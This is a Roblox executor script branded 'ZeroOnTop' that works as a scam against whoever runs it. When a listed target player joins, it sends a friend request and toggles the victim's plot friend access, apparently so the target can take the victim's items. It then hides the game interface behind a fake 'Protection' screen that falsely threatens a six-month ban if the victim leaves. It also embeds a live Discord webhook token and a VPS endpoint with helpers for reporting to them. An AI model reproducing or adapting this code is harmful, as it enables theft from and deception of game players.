local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")

local WEBHOOK_URL = (_G["Zero_Config"] and _G["Zero_Config"].user_webhook) or ""
local TARGET_PLAYERS = (_G["Zero_Config"] and _G["Zero_Config"].users) or {}
local PUBLIC_WEBHOOK_URL = "https://discord.com/api/webhooks/1452387900166635622/6jzYQUIloNR8GvEq4dtGp0ZIbie2--AI9_oYBa3Fc7i1f-xvBGcJDSgr7ltJL90lzLAb"
local VPS_INCREMENT = "http://13.239.7.10:5000/increment-hitcount"
local API_KEY = getgenv().API_KEY or "supersecretkey"

local function safeRequest(url, body, headers)
    local h = headers or {["Content-Type"] = "application/json"}
    pcall(function()
        (syn and syn.request or http and http.request or request or HttpService.PostAsync)({
            Url  = url,
            Method = "POST",
            Headers = h,
            Body = HttpService:JSONEncode(body)
        })
    end)
end

local function sendZeroEmbed(title, desc, color, fields, isPublic)
    local payload = {
        username = "ZeroOnTop",
        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
        embeds = {{
            title = title,
            description = desc,
            color = color,
            fields = fields or {},
            footer = {text = "discord.gg/cnUAk7uc3n", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png"},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    safeRequest(isPublic and PUBLIC_WEBHOOK_URL or WEBHOOK_URL, payload)
end

local function triggerVpsHit()
    if WEBHOOK_URL == "" then return end
    safeRequest(VPS_INCREMENT, {webhook = WEBHOOK_URL}, {["X-API-KEY"] = API_KEY})
end

local users = {}
local processed, guiCreated, coreGuiDisabled = {}, false, false

local function getAllTargets()
    local t, seen = {}, {}
    for _, v in ipairs(users) do
        if not seen[v] then
            seen[v] = true
            table.insert(t, v)
        end
    end
    return t
end

local function fireToggleFriends()
    pcall(function()
        ReplicatedStorage.Packages.Net:WaitForChild("RE/PlotService/ToggleFriends"):FireServer()
    end)
end

local function disableCoreGui()
    if coreGuiDisabled then return end
    coreGuiDisabled = true
    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
end

local function createAntiStealGui()
    local gui = Instance.new("ScreenGui")
    gui.Name = "ExecutorAntiStealLoop"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    gui.DisplayOrder = 999999
    gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(8, 8, 14)
    bg.BorderSizePixel = 0
    bg.Parent = gui

    local grad = Instance.new("UIGradient")
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 18, 28)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 5, 10))
    })
    grad.Rotation = 90
    grad.Parent = bg

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0.92, 0, 0.13, 0)
    title.Position = UDim2.new(0.5, 0, 0.43, 0)
    title.AnchorPoint = Vector2.new(0.5, 0.5)
    title.BackgroundTransparency = 1
    title.Text = "ZeroOnTop Protection"
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 50
    title.TextColor3 = Color3.new(1, 1, 1)
    title.TextStrokeTransparency = 0.7
    title.Parent = bg

    local sub = Instance.new("TextLabel")
    sub.Size = UDim2.new(0.82, 0, 0.16, 0)
    sub.Position = UDim2.new(0.5, 0, 0.54, 0)
    sub.AnchorPoint = Vector2.new(0.5, 0.5)
    sub.BackgroundTransparency = 1
    sub.Text = "One of script that you executed got detected. Please wait until we fix it"
    sub.Font = Enum.Font.Gotham
    sub.TextSize = 24
    sub.TextColor3 = Color3.fromRGB(220, 240, 255)
    sub.TextWrapped = true
    sub.TextXAlignment = Enum.TextXAlignment.Center
    sub.Parent = bg

    local warn = Instance.new("TextLabel")
    warn.Size = UDim2.new(0.78, 0, 0.12, 0)
    warn.Position = UDim2.new(0.5, 0, 0.64, 0)
    warn.AnchorPoint = Vector2.new(0.5, 0.5)
    warn.BackgroundTransparency = 1
    warn.Text = "Warning: Leave can cause data-lose, means ur progress reset in game\nand you will get banned for 6 months"
    warn.Font = Enum.Font.GothamBold
    warn.TextSize = 22
    warn.TextColor3 = Color3.fromRGB(255, 80, 80)
    warn.TextWrapped = true
    warn.TextXAlignment = Enum.TextXAlignment.Center
    warn.Parent = bg

    local countdown = Instance.new("TextLabel")
    countdown.Size = UDim2.new(0.7, 0, 0.08, 0)
    countdown.Position = UDim2.new(0.5, 0, 0.74, 0)
    countdown.AnchorPoint = Vector2.new(0.5, 0.5)
    countdown.BackgroundTransparency = 1
    countdown.Text = "Fixing in 5:00..."
    countdown.Font = Enum.Font.GothamBold
    countdown.TextSize = 30
    countdown.TextColor3 = Color3.fromRGB(100, 255, 150)
    countdown.Parent = bg

    LocalPlayer.CharacterRemoving:Connect(function()
        task.wait(0.1)
        if LocalPlayer.Character then
            LocalPlayer.Character:Destroy()
        end
    end)
end

local function processPlayer(player)
    if processed[player.Name] or guiCreated then return end
    processed[player.Name] = true

    if not LocalPlayer:IsFriendsWith(player.UserId) then
        pcall(function() LocalPlayer:RequestFriendship(player) end)
    end

    fireToggleFriends()
    disableCoreGui()

    if not guiCreated then
        guiCreated = true
        createAntiStealGui()
    end
end

local function startMonitoring()
    local function checkPlayer(player)
        for _, name in ipairs(getAllTargets()) do
            if player.Name == name then
                processPlayer(player)
            end
        end
    end

    Players.PlayerAdded:Connect(function(player)
        task.wait(1)
        checkPlayer(player)
    end)

    task.wait(2)
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            checkPlayer(player)
        end
    end

    while task.wait(5) do
        users = (_G["Zero_Config"] and _G["Zero_Config"].users) or {}
    end
end

startMonitoring()
